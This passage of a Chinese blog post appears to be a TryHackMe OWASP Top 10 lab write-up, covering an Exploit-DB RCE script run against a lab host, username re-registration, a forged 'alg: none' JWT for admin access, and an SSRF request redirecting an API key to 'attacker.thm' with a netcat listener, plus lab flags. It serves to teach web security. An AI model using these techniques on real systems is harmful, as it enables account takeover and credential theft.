<p>在 Bootstrap 中，从 2.3.0 版本开始，直到 3.4.0 版本之前，以及 4.x 版本在 4.1.2 版本之前，折叠组件的 data-parent 属性存在 XSS 漏洞。攻击者可以利用这个漏洞执行恶意的 JavaScript 代码。</p>
</blockquote>
<p>Bootstrap版本将显示在CSS文件的顶部。 只需打开它并查看文件的顶部。<br><img src="/PenTest_FILE/83bd1ae5422295c9c83154629310c35d_MD5.jpeg"><br><img src="/PenTest_FILE/d2599db0d3416b70d31ad8060cb43b05_MD5.jpeg"><br>居然是3.3.5的版本，存在XSS</p>
<p>但是这好像不能进行任意文件读取<br><img src="/PenTest_FILE/6922277e73dcc38538a65680bd5661cd_MD5.jpeg"></p>
<p>提示也不知道怎么用<br><img src="/PenTest_FILE/4bfeb09720fcfa26a5936873b82b53e2_MD5.jpeg"></p>
<p>wp使用了一个叫<code>searchsploit</code>的工具</p>
<blockquote>
<p>Searchsploit是一个用于Exploit-DB的命令行搜索工具，它还允许你随身带一份Exploit-DB的副本，SearchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力。</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit online book store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/PenTest_FILE/1637b9451dcdbaecbd79369dee074184_MD5.jpeg"></p>
<p>现在我们将使用漏洞利用 47887.py 在易受攻击的网站获取 rce（还真行啊）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 /usr/share/exploitdb/exploits/php/webapps/47887.py http://10.10.30.59:84/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/PenTest_FILE/661fae70e9ff05b0da40162c9d7384a5_MD5.jpeg"></p>
<ul>
<li>&#x2F;opt&#x2F;flag.txt 文件的内容是什么？答：THM{But_1ts_n0t_my_f4ult!}</li>
</ul>
<h1 id="七、身份验证缺陷"><a href="#七、身份验证缺陷" class="headerlink" title="七、身份验证缺陷"></a>七、身份验证缺陷</h1><p><strong>身份验证</strong> 和 <strong>会话管理</strong> 构成了现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序。最常见的身份验证形式是使用用户名和密码机制。用户将输入这些凭据，服务器将验证它们。如果正确的话，服务器将向用户的浏览器提供会话 cookie。需要会话 cookie，因为 Web 服务器使用 HTTP(S) 进行通信，这是无状态的。附加会话 cookie 意味着服务器将知道谁正在发送什么数据。然后服务器可以跟踪用户的操作。</p>
<p>如果攻击者能够发现身份验证机制中的缺陷，他们可能会成功访问其他用户的帐户。这将允许攻击者访问敏感数据（取决于应用程序的目的）。身份验证机制中的一些常见缺陷包括：</p>
<ul>
<li>暴力攻击：如果 Web 应用程序使用用户名和密码，攻击者可以尝试发起暴力攻击，通过多次身份验证尝试来猜测用户名和密码。</li>
<li>使用弱凭据：Web 应用程序应设置强密码策略。如果应用程序允许用户设置“password1”等密码或常用密码，则攻击者可以轻松猜出它们并访问用户帐户。</li>
<li>弱会话 Cookie：会话 Cookie 是服务器跟踪用户的方式。如果会话 cookie 包含可预测的值，攻击者就可以设置自己的会话 cookie 并访问用户的帐户。</li>
</ul>
<p>当然，根据具体的缺陷，可以有多种针对损坏的身份验证机制的缓解措施：</p>
<ul>
<li>为了避免密码猜测攻击，请确保应用程序强制执行强大的密码策略。</li>
<li>为了避免暴力攻击，请确保应用程序在一定次数的尝试后强制执行自动锁定。这将防止攻击者发起更多暴力攻击。</li>
<li>实施多重身份验证。如果用户有多种身份验证方法，例如使用用户名和密码并在移动设备上接收代码，则攻击者将很难同时获取密码和代码来访问帐户。</li>
</ul>
<h2 id="现有用户重新注册"><a href="#现有用户重新注册" class="headerlink" title="现有用户重新注册"></a>现有用户重新注册</h2><p>对于此示例，我们将研究身份验证机制中的逻辑缺陷。</p>
<p>很多时候，开发人员忘记清理用户在应用程序代码中给出的输入（用户名和密码），这可能使他们容易受到 SQL 注入等攻击。然而，我们将重点关注一个由于开发人员的错误而发生但非常容易被利用的漏洞，即现有用户的重新注册。</p>
<p>让我们通过一个例子来理解这一点，假设有一个名为 <code>admin</code> 的现有用户，我们想要访问他的帐户，我们可以做的是尝试重新注册该用户名。</p>
<p>不过需要稍作修改。我们将输入<code> admin</code>（注意开头的空格）。现在，当您在用户名字段中输入该信息并输入其他必需信息（例如电子邮件 ID 或密码）并提交该数据时，它将注册一个新用户，但该用户将拥有与管理员帐户相同的权利。该新用户还可以查看用户 <code>admin</code> 下显示的所有内容。</p>
<h2 id="练习-6"><a href="#练习-6" class="headerlink" title="练习"></a>练习</h2><p>要查看实际效果，请访问 <a target="_blank" rel="noopener" href="http://10.10.92.142:8088/">http://10.10.92.142:8088</a> 并尝试使用 <code>darren</code> 作为您的用户名进行注册。</p>
<p>我先使用<code>darren</code>用户名来进行注册，显示用户已存在：<br><img src="/PenTest_FILE/1d6efcaae9e72c5ba33fa2ebc16e39f2_MD5.jpeg"></p>
<p>使用<code> darren</code>注册<br><img src="/PenTest_FILE/ad8d726b3a49f144a18d90d1b13a6e12_MD5.jpeg"></p>
<ul>
<li>您在 darren 的帐户中找到的标志是什么？答：fe86079416a21a3c99937fea8874b667</li>
<li>现在尝试执行相同的操作，看看您是否可以以 Arthur 身份登录。你在亚瑟的账户中找到的旗帜是什么？答：<br>d9ac0f7db4fda460ac3edeb75d75e16e</li>
</ul>
<h1 id="八、数据完整性"><a href="#八、数据完整性" class="headerlink" title="八、数据完整性"></a>八、数据完整性</h1><p>当谈论完整性时，我们指的是我们必须确定一段数据未被修改的能力。完整性对于网络安全至关重要，因为我们关心维护重要数据免受不必要或恶意的修改。例如，假设您正在下载某个应用程序的最新安装程序。您如何确定下载时它没有在传输过程中被修改或因传输错误而被损坏？</p>
<p>为了解决这个问题，您经常会看到与文件一起发送的哈希值，以便您可以证明您下载的文件保持其完整性并且在传输过程中没有被修改。哈希或摘要只是对一段数据应用特定算法所产生的数字。在阅读有关哈希算法的内容时，您经常会阅读有关 MD5、SHA1、SHA256 或许多其他可用算法的内容。</p>
<p>此漏洞是由使用软件或数据而不使用任何类型的完整性检查的代码或基础设施引起的。由于没有进行完整性验证，攻击者可能会修改传递给应用程序的软件或数据，从而导致意外后果。</p>
<h2 id="软件完整性故障"><a href="#软件完整性故障" class="headerlink" title="软件完整性故障"></a>软件完整性故障</h2><p>假设您有一个网站，该网站使用第三方库，这些库存储在一些不受您控制的外部服务器中。</p>
<p>虽然这听起来有点奇怪，但这实际上是一种常见的做法。以常用的 javascript 库 jQuery 为例。如果需要，您可以直接从他们的服务器将 jQuery 添加到您的网站中，而无需实际下载它，只需在网站的 HTML 代码中添加以下行：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.6.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>当用户导航到您的网站时，其浏览器将读取其 HTML 代码并从指定的外部源下载 jQuery。<br><img src="/PenTest_FILE/fe9220009f8327a05a8de266d28dc98e_MD5.jpeg"></p>
<p>问题是，如果攻击者以某种方式侵入 jQuery 官方存储库，他们可以更改 <code>https://code.jquery.com/jquery-3.6.1.min.js</code> 的内容以注入恶意代码。因此，任何访问您网站的人现在都会提取恶意代码并在不知不觉中将其执行到浏览器中。这是软件完整性故障，因为您的网站没有检查第三方库以查看它是否已更改。现代浏览器允许您沿着库的 URL 指定哈希，以便仅当下载文件的哈希与预期值匹配时才执行库代码。这种安全机制称为子资源完整性 (SRI)</p>
<p>正确做法是在 HTML 代码中插入库的正确方法是使用 SRI 并包含完整性哈希，这样，如果攻击者能够以某种方式修改库，则任何浏览您网站的客户端都不会执行修改后的版本。 HTML 中的内容应如下所示：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.6.1.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>您可以访问<a target="_blank" rel="noopener" href="https://www.srihash.org/">SRI Hash Generator</a>，能够自动生成任何库的正确的插入库html代码。</p>
<h2 id="练习-7"><a href="#练习-7" class="headerlink" title="练习"></a>练习</h2><ul>
<li><a target="_blank" rel="noopener" href="https://code.jquery.com/jquery-1.12.4.min.js">https://code.jquery.com/jquery-1.12.4.min.js</a> 的 SHA-256 哈希值是什么？答：sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ&#x3D;</li>
</ul>
<h2 id="数据完整性故障"><a href="#数据完整性故障" class="headerlink" title="数据完整性故障"></a>数据完整性故障</h2><p>让我们考虑一下 Web 应用程序如何维护会话。通常，当用户登录应用程序时，他们将被分配某种会话令牌，只要会话持续，就需要将其保存在浏览器上。此令牌将在每个后续请求中重复，以便 Web 应用程序知道我们是谁。这些会话令牌可以有多种形式，但通常通过 cookie 分配。 <code>Cookie</code> 是网络应用程序将存储在用户浏览器上的键值对，并且会在每次向发出它们的网站发出请求时自动重复。</p>
<p>例如，如果您正在创建一个网络邮件应用程序，则可以在登录后为每个用户分配一个包含用户名的 cookie。在后续请求中，您的浏览器始终会在 cookie 中发送您的用户名，以便您的 Web 应用程序知道哪个用户正在连接。从安全角度来看，这将是一个糟糕的想法，因为正如我们提到的，cookie 存储在用户的浏览器上，因此如果用户篡改 cookie 并更改用户名，他们可能会冒充其他人并阅读他们的电子邮件！该应用程序将遭受数据完整性故障，因为它信任攻击者可以篡改的数据。</p>
<p>解决此问题的一种方法是使用某种完整性机制来保证 cookie 没有被用户更改。为了避免重新造轮子，我们可以使用一些令牌实现来允许您执行此操作并处理所有密码学以提供完整性证明，而无需您费心。 <code>JSON Web Tokens (JWT) </code>就是这样的一种实现。</p>
<p>JWT 是非常简单的令牌，允许您在令牌上存储键值对，并作为令牌的一部分提供完整性。这个想法是，您可以生成令牌，您可以向用户提供这些令牌，确保他们无法更改键值对并通过完整性检查。 JWT 令牌的结构由 3 部分组成：<br><img src="/PenTest_FILE/ba2bad5f7c22ab8d464ce84ab5b29df7_MD5.jpeg"></p>
<ul>
<li>header：标头包含指示这是 JWT 的元数据，并且使用的签名算法是 HS256</li>
<li>payload：有效负载包含键值对以及 Web 应用程序希望客户端存储的数据。</li>
<li>signature：签名类似于哈希，用于验证payload的完整性。</li>
</ul>
<p>⚠请注意，令牌的 3 个部分中的每一个部分都是使用 Base64 编码的简单明文。您可以使用此在线工具对 Base64 进行编码&#x2F;解码。尝试解码以下令牌的标头和有效负载（注意：签名包含二进制数据，所以即使你解码它，你也无法理解它的意义。）：<br>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw<br><img src="/PenTest_FILE/3a3f9f2357e08f821cc23172b024206c_MD5.jpeg"></p>
<h2 id="练习-8"><a href="#练习-8" class="headerlink" title="练习"></a>练习</h2><p>不久前，一些实现 JWT 的库存在数据完整性失败漏洞。正如我们所看到的，JWT 实现了签名来验证有效负载数据的完整性。但是易受攻击的库允许攻击者通过同时更改 JWT 中的以下两项来绕过签名验证：</p>
<ol>
<li>修改令牌的header部分，以便 alg 标头包含值 none 。</li>
<li>修改payload部分，使 username 标头为我们的目标用户名。</li>
<li>删除签名部分。</li>
</ol>
<p>以之前的 JWT 为例，如果我们想更改payload，使用户名变为“admin”且不进行签名检查，我们必须解码标头和payload。修改它们，然后将它们编码回来。<br><img src="/PenTest_FILE/8814b0cd759d04544e9091734e581a4c_MD5.jpeg"><br>⚠请注意我们虽然删除了签名部分，但保留了末尾的点。</p>
<ul>
<li><p>尝试以访客身份登录应用程序。客人的账户密码是什么？答：guest<br><img src="/PenTest_FILE/ad04caaddfd77f8bb04dd96a00eda6a3_MD5.jpeg"></p>
</li>
<li><p>包含 JWT 令牌的网站 cookie 的名称是什么？答：jwt-session<br>在登录guest:guest用户后被设置了cookie<br><img src="/PenTest_FILE/9929af92448db8bf9009020fa98bf565_MD5.jpeg"></p>
</li>
<li><p>使用在此任务中获得的知识来修改 JWT 令牌，以便应用程序认为您是用户“admin”。向管理员用户显示的标志是什么？答：THM{Dont_take_cookies_from_strangers}</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzEwNzY0NDQ4fQ.Yw2DrhzPMR9dEW4H9rV0qTEEqcS98_JTUQNF3VUs-Sc

改为
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzEwNzY0NDQ4fQ==.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h1 id="九、安全日志与监控失败"><a href="#九、安全日志与监控失败" class="headerlink" title="九、安全日志与监控失败"></a>九、安全日志与监控失败</h1><p>设置 Web 应用程序时，应记录用户执行的每个操作。日志记录很重要，因为一旦发生事件，可以追踪攻击者的活动。一旦追踪他们的行为，就可以确定他们的风险和影响。如果没有日志记录，就无法知道攻击者在获得对特定 Web 应用程序的访问权限时执行了哪些操作。这些更显着的影响包括：</p>
<ul>
<li>监管损害：如果攻击者获得了对用户个人身份信息的访问权限，并且没有相关记录，则最终用户会受到影响，并且应用程序所有者可能会根据法规受到罚款或更严厉的处罚。</li>
<li>进一步攻击的风险：如果不进行日志记录，可能无法检测到攻击者的存在。这可能允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步的攻击。</li>
</ul>
<p>日志中存储的信息应包括以下内容：</p>
<ul>
<li>HTTP 状态代码</li>
<li>时间戳</li>
<li>用户名</li>
<li>API端点&#x2F;页面位置</li>
<li>IP地址</li>
</ul>
<p>这些日志包含一些敏感信息，因此确保它们的安全存储以及这些日志的多个副本存储在不同位置非常重要。</p>
<p>您可能已经注意到，在发生违规或事件后，日志记录变得更加重要。理想的情况是进行监控以检测任何可疑活动。检测这种可疑活动的目的是完全阻止攻击者，或者如果检测到攻击者的存在比预期晚得多，则可以减少他们造成的影响。可疑活动的常见示例包。</p>
<h2 id="练习-9"><a href="#练习-9" class="headerlink" title="练习"></a>练习</h2><p>示例日志文件如下：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>攻击者使用什么 IP 地址？答：49.99.13.16</p>
</li>
<li><p>正在进行什么样的攻击？答：brute force<br>这看起来像是一种暴力攻击，其中运行了不同的用户名&#x2F;密码组合。</p>
</li>
</ul>
<h1 id="十、服务器端请求伪造"><a href="#十、服务器端请求伪造" class="headerlink" title="十、服务器端请求伪造"></a>十、服务器端请求伪造</h1><p>当攻击者可以强制 Web 应用程序代表他们向任意目的地发送请求，同时控制请求本身的内容时，就会出现这种类型的漏洞。 SSRF 漏洞通常源于我们的 Web 应用程序需要使用第三方服务的实现。</p>
<p>例如，考虑一个使用外部 API 向其客户端发送 SMS 通知的 Web 应用程序。对于每封电子邮件，网站都需要向 SMS 提供商的服务器发出 Web 请求，以发送要发送的消息内容。由于 SMS 提供商按消息收费，因此他们要求您为您向其 API 发出的每个请求添加他们预先分配给您的密钥。 API 密钥充当身份验证令牌，并允许提供商知道向谁计费每条消息。该应用程序将像这样工作：<br><img src="/PenTest_FILE/a88de69b44ccdd2f6282a8f9d1b43d82_MD5.jpeg"></p>
<p>通过查看上图，很容易看出漏洞所在。应用程序向用户公开 <code>server</code> 参数，该参数定义 SMS 服务提供商的服务器名称。如果攻击者愿意，他们可以简单地更改 <code>server</code> 的值以指向他们控制的计算机，并且您的 Web 应用程序会很乐意将 SMS 请求转发给攻击者而不是 SMS 提供商。作为转发消息的一部分，攻击者将获取 API 密钥，从而允许他们使用 SMS 服务发送消息，费用由您承担。为此，攻击者只需向您的网站发出以下请求：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这将使易受攻击的 Web 应用程序发出请求：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">https://attacker.thm/api/send?msg=ABC <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后您可以使用 Netcat 捕获请求的内容：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">user@attackbox$ <span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">80</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">80</span>
Connection received on <span class="token number">10.10</span>.1.236 <span class="token number">43830</span>
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: <span class="token number">10.10</span>.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>这是 SSRF 的一个非常基本的案例。如果这看起来没有那么可怕，那么 SSRF 实际上可以用来做更多的事情。一般来说，根据每个场景的具体情况，SSRF 可用于：</p>
<ul>
<li>枚举内部网络，包括 IP 地址和端口。</li>
<li>滥用服务器之间的信任关系并获取对其他受限服务的访问权限。</li>
<li>与一些非 HTTP 服务交互以获取远程代码执行 (RCE)。</li>
</ul>
<h2 id="练习-10"><a href="#练习-10" class="headerlink" title="练习"></a>练习</h2><ul>
<li><p>探索网站。唯一允许访问管理区域的主机是什么？答：admin<br><img src="/PenTest_FILE/e236617dc4c5be801bd210ee5726d936_MD5.jpeg"></p>
</li>
<li><p>检查“下载简历”按钮。服务器参数指向哪里？答：secure-file-storage.com<br><img src="/PenTest_FILE/c81a6a402e31ff37fc114f6679d1d880_MD5.jpeg"></p>
</li>
<li><p>使用 SSRF，使应用程序将请求发送到 AttackBox，而不是安全文件存储。拦截的请求中是否有API密钥？答：THM{Hello_Im_just_an_API_key}</p>
</li>
</ul>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/2024/03/18/OWASP%20Top10-2021/" class="leancloud-visitors view" data-flag-title="OWASP Top10-2021">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/03/22/RWCTF2022高校赛 - Digging into kernel 1 & 2/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/03/15/DASCTF2023六月挑战赛 二进制专场 DASKERNEL/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
		<section id="comments" class="comments">
			<style>
			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
			</style>
			<div id="vcomment" class="comment"></div>
<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
valineConfig.el='#vcomment';
new Valine(valineConfig);
    // new Valine({
    //     el: '#vcomment',
    //     appId: "",
    //     appKey: "",
    //     placeholder: "",
    //     avatar:"monsterid",
    //     visitor: "true",
    //     requiredFields: "nick,mail".split(','),
    // });
</script>

		</section>
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-03-18 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>5</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B8%80%E3%80%81%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">一、访问控制漏洞</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#IDOR"><span class="toc-article-text">IDOR</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BA%8C%E3%80%81%E5%8A%A0%E5%AF%86%E6%95%85%E9%9A%9C"><span class="toc-article-text">二、加密故障</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9D%90%E6%96%991"><span class="toc-article-text">材料1</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9D%90%E6%96%992"><span class="toc-article-text">材料2</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-1"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B8%89%E3%80%81%E6%B3%A8%E5%85%A5"><span class="toc-article-text">三、注入</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-article-text">命令注入</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-2"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%9B%9B%E3%80%81%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E8%AE%BE%E8%AE%A1"><span class="toc-article-text">四、不安全的设计</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A0%81%E8%AE%BE%E7%BD%AE"><span class="toc-article-text">不安全的密码设置</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-3"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BA%94%E3%80%81%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-article-text">五、安全配置错误</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3"><span class="toc-article-text">调试接口</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-4"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%AD%E3%80%81%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E6%88%96%E8%BF%87%E6%97%B6%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-article-text">六、易受攻击或过时的组件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-5"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B8%83%E3%80%81%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BC%BA%E9%99%B7"><span class="toc-article-text">七、身份验证缺陷</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%8E%B0%E6%9C%89%E7%94%A8%E6%88%B7%E9%87%8D%E6%96%B0%E6%B3%A8%E5%86%8C"><span class="toc-article-text">现有用户重新注册</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-6"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%AB%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7"><span class="toc-article-text">八、数据完整性</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%BD%AF%E4%BB%B6%E5%AE%8C%E6%95%B4%E6%80%A7%E6%95%85%E9%9A%9C"><span class="toc-article-text">软件完整性故障</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-7"><span class="toc-article-text">练习</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E6%95%85%E9%9A%9C"><span class="toc-article-text">数据完整性故障</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-8"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B9%9D%E3%80%81%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E4%B8%8E%E7%9B%91%E6%8E%A7%E5%A4%B1%E8%B4%A5"><span class="toc-article-text">九、安全日志与监控失败</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-9"><span class="toc-article-text">练习</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8D%81%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-article-text">十、服务器端请求伪造</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%83%E4%B9%A0-10"><span class="toc-article-text">练习</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 X1NRI's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
